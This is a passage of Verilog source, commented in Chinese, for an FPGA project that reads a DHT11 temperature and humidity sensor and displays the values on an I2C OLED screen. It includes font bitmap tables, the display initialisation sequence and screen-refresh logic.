//&#x27;d3000为低电平时间，高电平持续时间低于35us认为是数据0 dht11_data &lt;= &#123;dht11_data[38:0],1&#x27;b0&#125;; else if(dht11_negedge == 1&#x27;b1) dht11_data &lt;= &#123;dht11_data[38:0],1&#x27;b1&#125;; else dht11_data &lt;= dht11_data; else dht11_data &lt;= dht11_data; end /*接收bit计数*/ always@(posedge sys_clk or negedge rst_n) begin if(rst_n == 1&#x27;b0) DHT11Bit_Cnt &lt;= &#x27;d0; else if(state == S_DATA &amp;&amp; dht11_negedge == 1&#x27;b1) DHT11Bit_Cnt &lt;= DHT11Bit_Cnt + 1&#x27;b1; else if(state == S_DOEN) //结束后，bit计数清零 DHT11Bit_Cnt &lt;= &#x27;d0; else DHT11Bit_Cnt &lt;= DHT11Bit_Cnt; end endmodule 下面是oled的程序 OLED_FontData.v //中文16*16 数字和字母8*16 module OLED_FontData( input sys_clk, input rst_n, input font_row, input[5:0]\tfont_sel, input[8:0]\tindex, output reg[7:0] data ); reg[7:0] data0[15:0]; //F reg[7:0] data1[15:0]; //G reg[7:0] data2[15:0]; //P reg[7:0] data3[15:0]; //A reg[7:0] data4[31:0]; //之 reg[7:0] data5[31:0]; //旅 reg[7:0] data6[31:0]; //温 reg[7:0] data7[31:0]; //度 reg[7:0] data8[31:0]; //湿 reg[7:0] data9[31:0]; //度 reg[7:0] data10[15:0]; //. reg[7:0] data11[31:0]; //℃ reg[7:0] data12[15:0]; //R reg[7:0] data13[15:0]; //H always@(posedge sys_clk or negedge rst_n) begin if(rst_n == &#x27;d0) data &lt;= &#x27;d0; else if(font_sel == &#x27;d0) data &lt;= data0[index + &#x27;d8 * font_row]; else if(font_sel == &#x27;d1) data &lt;= data1[index + &#x27;d8 * font_row]; else if(font_sel == &#x27;d2) data &lt;= data2[index + &#x27;d8 * font_row]; else if(font_sel == &#x27;d3) data &lt;= data3[index + &#x27;d8 * font_row]; else if(font_sel == &#x27;d4) data &lt;= data4[index + &#x27;d16 * font_row]; else if(font_sel == &#x27;d5) data &lt;= data5[index + &#x27;d16 * font_row]; else if(font_sel == &#x27;d6) data &lt;= data6[index + &#x27;d16 * font_row]; else if(font_sel == &#x27;d7) data &lt;= data7[index + &#x27;d16 * font_row]; else if(font_sel == &#x27;d8) data &lt;= data8[index + &#x27;d16 * font_row]; else if(font_sel == &#x27;d9) data &lt;= data9[index + &#x27;d16 * font_row]; else if(font_sel == &#x27;d10) data &lt;= data10[index + &#x27;d8 * font_row]; else if(font_sel == &#x27;d11) data &lt;= data11[index + &#x27;d16 * font_row]; else if(font_sel == &#x27;d12) data &lt;= data12[index + &#x27;d8 * font_row]; else if(font_sel == &#x27;d13) data &lt;= data13[index + &#x27;d8 * font_row]; else if(font_sel == &#x27;d14) data &lt;= data10[index + &#x27;d8 * font_row]; else data &lt;= data; end always@(posedge sys_clk or negedge rst_n) begin if(rst_n == 1&#x27;b0) begin data0[0] = 8&#x27;h08; data0[1] = 8&#x27;hF8; data0[2] = 8&#x27;h88; data0[3] = 8&#x27;h88; data0[4] = 8&#x27;hE8; data0[5] = 8&#x27;h08; data0[6] = 8&#x27;h10; data0[7] = 8&#x27;h00; data0[8] = 8&#x27;h20; data0[9] = 8&#x27;h3F; data0[10] = 8&#x27;h20; data0[11] = 8&#x27;h00; data0[12] = 8&#x27;h03; data0[13] = 8&#x27;h00; data0[14] = 8&#x27;h00; data0[15] = 8&#x27;h00; end end always@(posedge sys_clk or negedge rst_n) begin if(rst_n == 1&#x27;b0) begin data1[0] = 8&#x27;h08; data1[1] = 8&#x27;hF8; data1[2] = 8&#x27;h08; data1[3] = 8&#x27;h08; data1[4] = 8&#x27;h08; data1[5] = 8&#x27;h08; data1[6] = 8&#x27;hF0; data1[7] = 8&#x27;h00; data1[8] = 8&#x27;h20; data1[9] = 8&#x27;h3F; data1[10] = 8&#x27;h21; data1[11] = 8&#x27;h01; data1[12] = 8&#x27;h01; data1[13] = 8&#x27;h01; data1[14] = 8&#x27;h00; data1[15] = 8&#x27;h00; end end always@(posedge sys_clk or negedge rst_n) begin if(rst_n == 1&#x27;b0) begin data2[0] = 8&#x27;hC0; data2[1] = 8&#x27;h30; data2[2] = 8&#x27;h08; data2[3] = 8&#x27;h08; data2[4] = 8&#x27;h08; data2[5] = 8&#x27;h38; data2[6] = 8&#x27;h00; data2[7] = 8&#x27;h00; data2[8] = 8&#x27;h07; data2[9] = 8&#x27;h18; data2[10] = 8&#x27;h20; data2[11] = 8&#x27;h20; data2[12] = 8&#x27;h22; data2[13] = 8&#x27;h1E; data2[14] = 8&#x27;h02; data2[15] = 8&#x27;h00; end end always@(posedge sys_clk or negedge rst_n) begin if(rst_n == 1&#x27;b0) begin data3[0] = 8&#x27;h00; data3[1] = 8&#x27;h00; data3[2] = 8&#x27;hC0; data3[3] = 8&#x27;h38; data3[4] = 8&#x27;hE0; data3[5] = 8&#x27;h00; data3[6] = 8&#x27;h00; data3[7] = 8&#x27;h00; data3[8] = 8&#x27;h20; data3[9] = 8&#x27;h3C; data3[10] = 8&#x27;h23; data3[11] = 8&#x27;h02; data3[12] = 8&#x27;h02; data3[13] = 8&#x27;h27; data3[14] = 8&#x27;h38; data3[15] = 8&#x27;h20; end end always@(posedge sys_clk or negedge rst_n) begin if(rst_n == 1&#x27;b0) begin data4[0] = 8&#x27;h10; data4[1] = 8&#x27;h0C; data4[2] = 8&#x27;h04; data4[3] = 8&#x27;h84; data4[4] = 8&#x27;h14; data4[5] = 8&#x27;h64; data4[6] = 8&#x27;h05; data4[7] = 8&#x27;h06; data4[8] = 8&#x27;hF4; data4[9] = 8&#x27;h04; data4[10] = 8&#x27;h04; data4[11] = 8&#x27;h04; data4[12] = 8&#x27;h04; data4[13] = 8&#x27;h14; data4[14] = 8&#x27;h0C; data4[15] = 8&#x27;h00; data4[16] = 8&#x27;h04; data4[17] = 8&#x27;h84; data4[18] = 8&#x27;h84; data4[19] = 8&#x27;h44; data4[20] = 8&#x27;h47; data4[21] = 8&#x27;h24; data4[22] = 8&#x27;h14; data4[23] = 8&#x27;h0C; data4[24] = 8&#x27;h07; data4[25] = 8&#x27;h0C; data4[26] = 8&#x27;h14; data4[27] = 8&#x27;h24; data4[28] = 8&#x27;h44; data4[29] = 8&#x27;h84; data4[30] = 8&#x27;h04; data4[31] = 8&#x27;h00; end end always@(posedge sys_clk or negedge rst_n) begin if(rst_n == 1&#x27;b0) begin data5[0] = 8&#x27;h02; data5[1] = 8&#x27;hFA; data5[2] = 8&#x27;h82; data5[3] = 8&#x27;h82; data5[4] = 8&#x27;hFE; data5[5] = 8&#x27;h80; data5[6] = 8&#x27;h40; data5[7] = 8&#x27;h20; data5[8] = 8&#x27;h50; data5[9] = 8&#x27;h4C; data5[10] = 8&#x27;h43; data5[11] = 8&#x27;h4C; data5[12] = 8&#x27;h50; data5[13] = 8&#x27;h20; data5[14] = 8&#x27;h40; data5[15] = 8&#x27;h00; data5[16] = 8&#x27;h08; data5[17] = 8&#x27;h18; data5[18] = 8&#x27;h48; data5[19] = 8&#x27;h84; data5[20] = 8&#x27;h44; data5[21] = 8&#x27;h3F; data5[22] = 8&#x27;h40; data5[23] = 8&#x27;h44; data5[24] = 8&#x27;h58; data5[25] = 8&#x27;h41; data5[26] = 8&#x27;h4E; data5[27] = 8&#x27;h60; data5[28] = 8&#x27;h58; data5[29] = 8&#x27;h47; data5[30] = 8&#x27;h40; data5[31] = 8&#x27;h00; end end always@(posedge sys_clk or negedge rst_n) begin if(rst_n == 1&#x27;b0) begin data6[0] = 8&#x27;h10; data6[1] = 8&#x27;h60; data6[2] = 8&#x27;h02; data6[3] = 8&#x27;h8C; data6[4] = 8&#x27;h00; data6[5] = 8&#x27;h00; data6[6] = 8&#x27;hFE; data6[7] = 8&#x27;h92; data6[8] = 8&#x27;h92; data6[9] = 8&#x27;h92; data6[10] = 8&#x27;h92; data6[11] = 8&#x27;h92; data6[12] = 8&#x27;hFE; data6[13] = 8&#x27;h00; data6[14] = 8&#x27;h00; data6[15] = 8&#x27;h00; data6[16] = 8&#x27;h04; data6[17] = 8&#x27;h04; data6[18] = 8&#x27;h7E; data6[19] = 8&#x27;h01; data6[20] = 8&#x27;h40; data6[21] = 8&#x27;h7E; data6[22] = 8&#x27;h42; data6[23] = 8&#x27;h42; data6[24] = 8&#x27;h7E; data6[25] = 8&#x27;h42; data6[26] = 8&#x27;h7E; data6[27] = 8&#x27;h42; data6[28] = 8&#x27;h42; data6[29] = 8&#x27;h7E; data6[30] = 8&#x27;h40; data6[31] = 8&#x27;h00; end end always@(posedge sys_clk or negedge rst_n) begin if(rst_n == 1&#x27;b0) begin data7[0] = 8&#x27;h00; data7[1] = 8&#x27;h00; data7[2] = 8&#x27;hFC; data7[3] = 8&#x27;h24; data7[4] = 8&#x27;h24; data7[5] = 8&#x27;h24; data7[6] = 8&#x27;hFC; data7[7] = 8&#x27;h25; data7[8] = 8&#x27;h26; data7[9] = 8&#x27;h24; data7[10] = 8&#x27;hFC; data7[11] = 8&#x27;h24; data7[12] = 8&#x27;h24; data7[13] = 8&#x27;h24; data7[14] = 8&#x27;h04; data7[15] = 8&#x27;h00; data7[16] = 8&#x27;h40; data7[17] = 8&#x27;h30; data7[18] = 8&#x27;h8F; data7[19] = 8&#x27;h80; data7[20] = 8&#x27;h84; data7[21] = 8&#x27;h4C; data7[22] = 8&#x27;h55; data7[23] = 8&#x27;h25; data7[24] = 8&#x27;h25; data7[25] = 8&#x27;h25; data7[26] = 8&#x27;h55; data7[27] = 8&#x27;h4C; data7[28] = 8&#x27;h80; data7[29] = 8&#x27;h80; data7[30] = 8&#x27;h80; data7[31] = 8&#x27;h00; end end always@(posedge sys_clk or negedge rst_n) begin if(rst_n == 1&#x27;b0) begin data8[0] = 8&#x27;h10; data8[1] = 8&#x27;h60; data8[2] = 8&#x27;h02; data8[3] = 8&#x27;h8C; data8[4] = 8&#x27;h00; data8[5] = 8&#x27;hFE; data8[6] = 8&#x27;h92; data8[7] = 8&#x27;h92; data8[8] = 8&#x27;h92; data8[9] = 8&#x27;h92; data8[10] = 8&#x27;h92; data8[11] = 8&#x27;h92; data8[12] = 8&#x27;hFE; data8[13] = 8&#x27;h00; data8[14] = 8&#x27;h00; data8[15] = 8&#x27;h00; data8[16] = 8&#x27;h04; data8[17] = 8&#x27;h04; data8[18] = 8&#x27;h7E; data8[19] = 8&#x27;h01; data8[20] = 8&#x27;h44; data8[21] = 8&#x27;h48; data8[22] = 8&#x27;h50; data8[23] = 8&#x27;h7F; data8[24] = 8&#x27;h40; data8[25] = 8&#x27;h40; data8[26] = 8&#x27;h7F; data8[27] = 8&#x27;h50; data8[28] = 8&#x27;h48; data8[29] = 8&#x27;h44; data8[30] = 8&#x27;h40; data8[31] = 8&#x27;h00; end end always@(posedge sys_clk or negedge rst_n) begin if(rst_n == 1&#x27;b0) begin data9[0] = 8&#x27;h00; data9[1] = 8&#x27;h00; data9[2] = 8&#x27;hFC; data9[3] = 8&#x27;h24; data9[4] = 8&#x27;h24; data9[5] = 8&#x27;h24; data9[6] = 8&#x27;hFC; data9[7] = 8&#x27;h25; data9[8] = 8&#x27;h26; data9[9] = 8&#x27;h24; data9[10] = 8&#x27;hFC; data9[11] = 8&#x27;h24; data9[12] = 8&#x27;h24; data9[13] = 8&#x27;h24; data9[14] = 8&#x27;h04; data9[15] = 8&#x27;h00; data9[16] = 8&#x27;h40; data9[17] = 8&#x27;h30; data9[18] = 8&#x27;h8F; data9[19] = 8&#x27;h80; data9[20] = 8&#x27;h84; data9[21] = 8&#x27;h4C; data9[22] = 8&#x27;h55; data9[23] = 8&#x27;h25; data9[24] = 8&#x27;h25; data9[25] = 8&#x27;h25; data9[26] = 8&#x27;h55; data9[27] = 8&#x27;h4C; data9[28] = 8&#x27;h80; data9[29] = 8&#x27;h80; data9[30] = 8&#x27;h80; data9[31] = 8&#x27;h00; end end always@(posedge sys_clk or negedge rst_n) begin if(rst_n == 1&#x27;b0) begin data10[0] = 8&#x27;h00; data10[1] = 8&#x27;h00; data10[2] = 8&#x27;h00; data10[3] = 8&#x27;h00; data10[4] = 8&#x27;h00; data10[5] = 8&#x27;h00; data10[6] = 8&#x27;h00; data10[7] = 8&#x27;h00; data10[8] = 8&#x27;h00; data10[9] = 8&#x27;h30; data10[10] = 8&#x27;h30; data10[11] = 8&#x27;h00; data10[12] = 8&#x27;h00; data10[13] = 8&#x27;h00; data10[14] = 8&#x27;h00; data10[15] = 8&#x27;h00; end end always@(posedge sys_clk or negedge rst_n) begin if(rst_n == 1&#x27;b0) begin data11[0] = 8&#x27;h06; data11[1] = 8&#x27;h09; data11[2] = 8&#x27;h09; data11[3] = 8&#x27;hE6; data11[4] = 8&#x27;hF8; data11[5] = 8&#x27;h0C; data11[6] = 8&#x27;h04; data11[7] = 8&#x27;h02; data11[8] = 8&#x27;h02; data11[9] = 8&#x27;h02; data11[10] = 8&#x27;h02; data11[11] = 8&#x27;h02; data11[12] = 8&#x27;h04; data11[13] = 8&#x27;h1E; data11[14] = 8&#x27;h00; data11[15] = 8&#x27;h00; data11[16] = 8&#x27;h00; data11[17] = 8&#x27;h00; data11[18] = 8&#x27;h00; data11[19] = 8&#x27;h07; data11[20] = 8&#x27;h1F; data11[21] = 8&#x27;h30; data11[22] = 8&#x27;h20; data11[23] = 8&#x27;h40; data11[24] = 8&#x27;h40; data11[25] = 8&#x27;h40; data11[26] = 8&#x27;h40; data11[27] = 8&#x27;h40; data11[28] = 8&#x27;h20; data11[29] = 8&#x27;h10; data11[30] = 8&#x27;h00; data11[31] = 8&#x27;h00; end end always@(posedge sys_clk or negedge rst_n) begin if(rst_n == 1&#x27;b0) begin data12[0] = 8&#x27;h08; data12[1] = 8&#x27;hF8; data12[2] = 8&#x27;h88; data12[3] = 8&#x27;h88; data12[4] = 8&#x27;h88; data12[5] = 8&#x27;h88; data12[6] = 8&#x27;h70; data12[7] = 8&#x27;h00; data12[8] = 8&#x27;h20; data12[9] = 8&#x27;h3F; data12[10] = 8&#x27;h20; data12[11] = 8&#x27;h00; data12[12] = 8&#x27;h03; data12[13] = 8&#x27;h0C; data12[14] = 8&#x27;h30; data12[15] = 8&#x27;h20; end end always@(posedge sys_clk or negedge rst_n) begin if(rst_n == 1&#x27;b0) begin data13[0] = 8&#x27;h08; data13[1] = 8&#x27;hF8; data13[2] = 8&#x27;h08; data13[3] = 8&#x27;h00; data13[4] = 8&#x27;h00; data13[5] = 8&#x27;h08; data13[6] = 8&#x27;hF8; data13[7] = 8&#x27;h08; data13[8] = 8&#x27;h20; data13[9] = 8&#x27;h3F; data13[10] = 8&#x27;h21; data13[11] = 8&#x27;h01; data13[12] = 8&#x27;h01; data13[13] = 8&#x27;h21; data13[14] = 8&#x27;h3F; data13[15] = 8&#x27;h20; end end endmodule OLED_Init.v //oled_init 初始化模块 module OLED_Init( input sys_clk, input rst_n, input init_req, //初始化请求 input write_done, //一组初始化数据完成信号 output init_finish, //初始化完成输出 output[23:0] Init_data //初始化的数据 ); localparam RST_T =\t1&#x27;b0; //复位有效 reg[23:0] Init_data_reg; reg[4:0] Init_index; assign Init_data = Init_data_reg; assign init_finish = (Init_index &gt;= &#x27;d26 &amp;&amp; write_done == 1&#x27;b1) ? 1&#x27;b1 : 1&#x27;b0;//初始化完成信号 always@(posedge sys_clk or negedge rst_n) begin if(rst_n == RST_T) Init_index &lt;= &#x27;d0; else if(Init_index == &#x27;d26 &amp;&amp; write_done == 1&#x27;b1 ) Init_index &lt;= &#x27;d0; else if(write_done == 1&#x27;b1 &amp;&amp; init_req == 1&#x27;b1) Init_index &lt;= Init_index + 1&#x27;b1; else Init_index &lt;= Init_index; end always@(*) begin case(Init_index) &#x27;d0: Init_data_reg &lt;= &#123;8&#x27;h78,8&#x27;h00,8&#x27;hAE&#125;; &#x27;d1: Init_data_reg &lt;= &#123;8&#x27;h78,8&#x27;h00,8&#x27;h00&#125;; &#x27;d2: Init_data_reg &lt;= &#123;8&#x27;h78,8&#x27;h00,8&#x27;h10&#125;; &#x27;d3: Init_data_reg &lt;= &#123;8&#x27;h78,8&#x27;h00,8&#x27;h40&#125;; &#x27;d4: Init_data_reg &lt;= &#123;8&#x27;h78,8&#x27;h00,8&#x27;hB0&#125;; &#x27;d5: Init_data_reg &lt;= &#123;8&#x27;h78,8&#x27;h00,8&#x27;h81&#125;; &#x27;d6: Init_data_reg &lt;= &#123;8&#x27;h78,8&#x27;h00,8&#x27;hFF&#125;; &#x27;d7: Init_data_reg &lt;= &#123;8&#x27;h78,8&#x27;h00,8&#x27;hA1&#125;; &#x27;d8: Init_data_reg &lt;= &#123;8&#x27;h78,8&#x27;h00,8&#x27;hA6&#125;; &#x27;d9: Init_data_reg &lt;= &#123;8&#x27;h78,8&#x27;h00,8&#x27;hA8&#125;; &#x27;d10:\tInit_data_reg &lt;= &#123;8&#x27;h78,8&#x27;h00,8&#x27;h3F&#125;; &#x27;d11:\tInit_data_reg &lt;= &#123;8&#x27;h78,8&#x27;h00,8&#x27;hC8&#125;; &#x27;d12:\tInit_data_reg &lt;= &#123;8&#x27;h78,8&#x27;h00,8&#x27;hD3&#125;; &#x27;d13:\tInit_data_reg &lt;= &#123;8&#x27;h78,8&#x27;h00,8&#x27;h00&#125;; &#x27;d14:\tInit_data_reg &lt;= &#123;8&#x27;h78,8&#x27;h00,8&#x27;hD5&#125;; &#x27;d15:\tInit_data_reg &lt;= &#123;8&#x27;h78,8&#x27;h00,8&#x27;h80&#125;; &#x27;d16:\tInit_data_reg &lt;= &#123;8&#x27;h78,8&#x27;h00,8&#x27;hD8&#125;; &#x27;d17:\tInit_data_reg &lt;= &#123;8&#x27;h78,8&#x27;h00,8&#x27;h05&#125;; &#x27;d18:\tInit_data_reg &lt;= &#123;8&#x27;h78,8&#x27;h00,8&#x27;hD9&#125;; &#x27;d19:\tInit_data_reg &lt;= &#123;8&#x27;h78,8&#x27;h00,8&#x27;hF1&#125;; &#x27;d20:\tInit_data_reg &lt;= &#123;8&#x27;h78,8&#x27;h00,8&#x27;hDA&#125;; &#x27;d21:\tInit_data_reg &lt;= &#123;8&#x27;h78,8&#x27;h00,8&#x27;h12&#125;; &#x27;d22:\tInit_data_reg &lt;= &#123;8&#x27;h78,8&#x27;h00,8&#x27;hDB&#125;; &#x27;d23:\tInit_data_reg &lt;= &#123;8&#x27;h78,8&#x27;h00,8&#x27;h30&#125;; &#x27;d24:\tInit_data_reg &lt;= &#123;8&#x27;h78,8&#x27;h00,8&#x27;h8D&#125;; &#x27;d25:\tInit_data_reg &lt;= &#123;8&#x27;h78,8&#x27;h00,8&#x27;h14&#125;; &#x27;d26:\tInit_data_reg &lt;= &#123;8&#x27;h78,8&#x27;h00,8&#x27;hAF&#125;; default: Init_data_reg &lt;= &#123;8&#x27;h78,8&#x27;h00,8&#x27;hAE&#125;; endcase end endmodule OLED_NumData.v /*数字数据0-9*/ module OLED_NumData( input sys_clk, input rst_n, input font_row, input[4:0]\tfont_sel, input[4:0]\tindex, output reg[7:0] data ); /*0-9*/ reg[7:0] data0[15:0]; reg[7:0] data1[15:0]; reg[7:0] data2[15:0]; reg[7:0] data3[15:0]; reg[7:0] data4[15:0]; reg[7:0] data5[15:0]; reg[7:0] data6[15:0]; reg[7:0] data7[15:0]; reg[7:0] data8[15:0]; reg[7:0] data9[15:0]; always@(posedge sys_clk or negedge rst_n) begin if(rst_n == 1&#x27;b0) data &lt;= &#x27;d0; else if(font_sel == &#x27;d0) data &lt;= data0[index + &#x27;d8 * font_row]; else if(font_sel == &#x27;d1) data &lt;= data1[index + &#x27;d8 * font_row]; else if(font_sel == &#x27;d2) data &lt;= data2[index + &#x27;d8 * font_row]; else if(font_sel == &#x27;d3) data &lt;= data3[index + &#x27;d8 * font_row]; else if(font_sel == &#x27;d4) data &lt;= data4[index + &#x27;d8 * font_row]; else if(font_sel == &#x27;d5) data &lt;= data5[index + &#x27;d8 * font_row]; else if(font_sel == &#x27;d6) data &lt;= data6[index + &#x27;d8 * font_row]; else if(font_sel == &#x27;d7) data &lt;= data7[index + &#x27;d8 * font_row]; else if(font_sel == &#x27;d8) data &lt;= data8[index + &#x27;d8 * font_row]; else if(font_sel == &#x27;d9) data &lt;= data9[index + &#x27;d8 * font_row]; end always@(posedge sys_clk or negedge rst_n) begin if(rst_n == 1&#x27;b0) begin data0[0] = 8&#x27;h00; data0[1] = 8&#x27;hE0; data0[2] = 8&#x27;h10; data0[3] = 8&#x27;h08; data0[4] = 8&#x27;h08; data0[5] = 8&#x27;h10; data0[6] = 8&#x27;hE0; data0[7] = 8&#x27;h00; data0[8] = 8&#x27;h00; data0[9] = 8&#x27;h0F; data0[10] = 8&#x27;h10; data0[11] = 8&#x27;h20; data0[12] = 8&#x27;h20; data0[13] = 8&#x27;h10; data0[14] = 8&#x27;h0F; data0[15] = 8&#x27;h00; end end always@(posedge sys_clk or negedge rst_n) begin if(rst_n == 1&#x27;b0) begin data1[0] = 8&#x27;h00; data1[1] = 8&#x27;h00; data1[2] = 8&#x27;h10; data1[3] = 8&#x27;h10; data1[4] = 8&#x27;hF8; data1[5] = 8&#x27;h00; data1[6] = 8&#x27;h00; data1[7] = 8&#x27;h00; data1[8] = 8&#x27;h00; data1[9] = 8&#x27;h00; data1[10] = 8&#x27;h20; data1[11] = 8&#x27;h20; data1[12] = 8&#x27;h3F; data1[13] = 8&#x27;h20; data1[14] = 8&#x27;h20; data1[15] = 8&#x27;h00; end end always@(posedge sys_clk or negedge rst_n) begin if(rst_n == 1&#x27;b0) begin data2[0] = 8&#x27;h00; data2[1] = 8&#x27;h70; data2[2] = 8&#x27;h08; data2[3] = 8&#x27;h08; data2[4] = 8&#x27;h08; data2[5] = 8&#x27;h08; data2[6] = 8&#x27;hF0; data2[7] = 8&#x27;h00; data2[8] = 8&#x27;h00; data2[9] = 8&#x27;h30; data2[10] = 8&#x27;h28; data2[11] = 8&#x27;h24; data2[12] = 8&#x27;h22; data2[13] = 8&#x27;h21; data2[14] = 8&#x27;h30; data2[15] = 8&#x27;h00; end end always@(posedge sys_clk or negedge rst_n) begin if(rst_n == 1&#x27;b0) begin data3[0] = 8&#x27;h00; data3[1] = 8&#x27;h30; data3[2] = 8&#x27;h08; data3[3] = 8&#x27;h08; data3[4] = 8&#x27;h08; data3[5] = 8&#x27;h88; data3[6] = 8&#x27;h70; data3[7] = 8&#x27;h00; data3[8] = 8&#x27;h00; data3[9] = 8&#x27;h18; data3[10] = 8&#x27;h20; data3[11] = 8&#x27;h21; data3[12] = 8&#x27;h21; data3[13] = 8&#x27;h22; data3[14] = 8&#x27;h1C; data3[15] = 8&#x27;h00; end end always@(posedge sys_clk or negedge rst_n) begin if(rst_n == 1&#x27;b0) begin data4[0] = 8&#x27;h00; data4[1] = 8&#x27;h00; data4[2] = 8&#x27;h80; data4[3] = 8&#x27;h40; data4[4] = 8&#x27;h30; data4[5] = 8&#x27;hF8; data4[6] = 8&#x27;h00; data4[7] = 8&#x27;h00; data4[8] = 8&#x27;h00; data4[9] = 8&#x27;h06; data4[10] = 8&#x27;h05; data4[11] = 8&#x27;h24; data4[12] = 8&#x27;h24; data4[13] = 8&#x27;h3F; data4[14] = 8&#x27;h24; data4[15] = 8&#x27;h24; end end always@(posedge sys_clk or negedge rst_n) begin if(rst_n == 1&#x27;b0) begin data5[0] = 8&#x27;h00; data5[1] = 8&#x27;hF8; data5[2] = 8&#x27;h88; data5[3] = 8&#x27;h88; data5[4] = 8&#x27;h88; data5[5] = 8&#x27;h08; data5[6] = 8&#x27;h08; data5[7] = 8&#x27;h00; data5[8] = 8&#x27;h00; data5[9] = 8&#x27;h19; data5[10] = 8&#x27;h20; data5[11] = 8&#x27;h20; data5[12] = 8&#x27;h20; data5[13] = 8&#x27;h11; data5[14] = 8&#x27;h0E; data5[15] = 8&#x27;h00; end end always@(posedge sys_clk or negedge rst_n) begin if(rst_n == 1&#x27;b0) begin data6[0] = 8&#x27;h00; data6[1] = 8&#x27;hE0; data6[2] = 8&#x27;h10; data6[3] = 8&#x27;h88; data6[4] = 8&#x27;h88; data6[5] = 8&#x27;h90; data6[6] = 8&#x27;h00; data6[7] = 8&#x27;h00; data6[8] = 8&#x27;h00; data6[9] = 8&#x27;h0F; data6[10] = 8&#x27;h11; data6[11] = 8&#x27;h20; data6[12] = 8&#x27;h20; data6[13] = 8&#x27;h20; data6[14] = 8&#x27;h1F; data6[15] = 8&#x27;h00; end end always@(posedge sys_clk or negedge rst_n) begin if(rst_n == 1&#x27;b0) begin data7[0] = 8&#x27;h00; data7[1] = 8&#x27;h18; data7[2] = 8&#x27;h08; data7[3] = 8&#x27;h08; data7[4] = 8&#x27;h88; data7[5] = 8&#x27;h68; data7[6] = 8&#x27;h18; data7[7] = 8&#x27;h00; data7[8] = 8&#x27;h00; data7[9] = 8&#x27;h00; data7[10] = 8&#x27;h00; data7[11] = 8&#x27;h3E; data7[12] = 8&#x27;h01; data7[13] = 8&#x27;h00; data7[14] = 8&#x27;h00; data7[15] = 8&#x27;h00; end end always@(posedge sys_clk or negedge rst_n) begin if(rst_n == 1&#x27;b0) begin data8[0] = 8&#x27;h00; data8[1] = 8&#x27;h70; data8[2] = 8&#x27;h88; data8[3] = 8&#x27;h08; data8[4] = 8&#x27;h08; data8[5] = 8&#x27;h88; data8[6] = 8&#x27;h70; data8[7] = 8&#x27;h00; data8[8] = 8&#x27;h00; data8[9] = 8&#x27;h1C; data8[10] = 8&#x27;h22; data8[11] = 8&#x27;h21; data8[12] = 8&#x27;h21; data8[13] = 8&#x27;h22; data8[14] = 8&#x27;h1C; data8[15] = 8&#x27;h00; end end always@(posedge sys_clk or negedge rst_n) begin if(rst_n == 1&#x27;b0) begin data9[0] = 8&#x27;h00; data9[1] = 8&#x27;hF0; data9[2] = 8&#x27;h08; data9[3] = 8&#x27;h08; data9[4] = 8&#x27;h08; data9[5] = 8&#x27;h10; data9[6] = 8&#x27;hE0; data9[7] = 8&#x27;h00; data9[8] = 8&#x27;h00; data9[9] = 8&#x27;h01; data9[10] = 8&#x27;h12; data9[11] = 8&#x27;h22; data9[12] = 8&#x27;h22; data9[13] = 8&#x27;h11; data9[14] = 8&#x27;h0F; data9[15] = 8&#x27;h00; end end endmodule OLED_Refresh.v //刷新模块，将oled屏幕全部变为黑色 module OLED_Refresh( input sys_clk, input rst_n, input refresh_req, //初始化请求 input write_done, //一组初始化数据完成信号 output refresh_finish, //初始化完成输出 output[23:0] refresh_data //初始化的数据 ); reg[23:0] refresh_data_reg; reg[10:0] refresh_index; reg[2:0] page; assign refresh_data = refresh_data_reg; assign refresh_finish = (page == &#x27;d7 &amp;&amp; refresh_index == &#x27;d130 &amp;&amp; write_done == 1&#x27;b1) ? 1&#x27;b1 : 1&#x27;b0; always@(posedge sys_clk or negedge rst_n) begin if(rst_n == 1&#x27;b0) refresh_index &lt;= &#x27;d0; else if(refresh_index == &#x27;d130 &amp;&amp; write_done == 1&#x27;b1) refresh_index &lt;= &#x27;d0; else if(write_done == 1&#x27;b1) refresh_index &lt;= refresh_index + 1&#x27;b1; else refresh_index &lt;= refresh_index; end always@(posedge sys_clk or negedge rst_n) begin if(rst_n == 1&#x27;b0) page &lt;= &#x27;d0; else if(refresh_index == &#x27;d130 &amp;&amp; write_done == 1&#x27;b1) page &lt;= page + 1&#x27;b1; else page &lt;= page; end always@(*) begin case(refresh_index) &#x27;d0: refresh_data_reg &lt;= &#123;8&#x27;h78,8&#x27;h00,8&#x27;hB0 + page&#125;; &#x27;d1: refresh_data_reg &lt;= &#123;8&#x27;h78,8&#x27;h00,8&#x27;h00&#125;; &#x27;d2: refresh_data_reg &lt;= &#123;8&#x27;h78,8&#x27;h00,8&#x27;h10&#125;; default: refresh_data_reg &lt;= &#123;8&#x27;h78,8&#x27;h40,8&#x27;h00&#125;; endcase end endmodule OLED_SelData.v module OLED_SelData( input sys_clk, input rst_n, input init_req, input[23:0] init_data, input refresh_req, input[23:0] refresh_data, input showfont_req, input[23:0] showfont_data, input showdata_req, input[23:0] showdata_data, output IICWriteReq, output[23:0]\tIICWriteData ); reg IICWriteReqReg; reg[23:0] IICWriteDataReg; assign IICWriteReq = init_req | showfont_req | refresh_req | showdata_req; assign IICWriteData = (init_req == 1&#x27;b1) ? init_data : (refresh_req == 1&#x27;b1) ? refresh_data : (showfont_req == 1&#x27;b1) ? showfont_data : showdata_data; endmodule OLED_ShowData.v module OLED_ShowData( input sys_clk, input rst_n, input dht11_done, input[7:0] tempH, input[7:0] tempL, input[7:0] humidityH, input[7:0] humidityL, input ShowData_req, //字符显示请求 input write_done, //iic一组数据写完成 output[23:0]\tShowData_Data, //字符显示数据 output ShowData_finish //字符显示完成 ); // //reg[3:0] tempHH; //tempH的高位 //reg[3:0] tempHL; //tempH的低位 //reg[3:0] tempLH; //reg[3:0] tempLL; // //reg[3:0] humidityHH; //reg[3:0] humidityHL; //reg[3:0] humidityLH; //reg[3:0] humidityLL; reg[7:0] tempHREG; reg[7:0] tempLREG; reg[7:0] humidityHREG; reg[7:0] humidityLREG; reg[4:0] font; reg[4:0] font_sel; reg[4:0] font_index; reg font_row; reg[7:0] show_x; reg[3:0] show_y; reg[23:0] showfont_data_reg; wire onefont_finish; wire[7:0] fontdata; assign onefont_finish = (font_row == 1&#x27;b1 &amp;&amp; font_index == &#x27;d10 &amp;&amp; write_done == 1&#x27;b1) ? 1&#x27;b1 : 1&#x27;b0; assign ShowData_finish = (onefont_finish == 1&#x27;b1 &amp;&amp; font_sel == &#x27;d7) ? 1&#x27;b1 : 1&#x27;b0; assign ShowData_Data = showfont_data_reg; always@(*) begin case(font_index) &#x27;d0:\tshowfont_data_reg &lt;= &#123;8&#x27;h78,8&#x27;h00,8&#x27;hB0 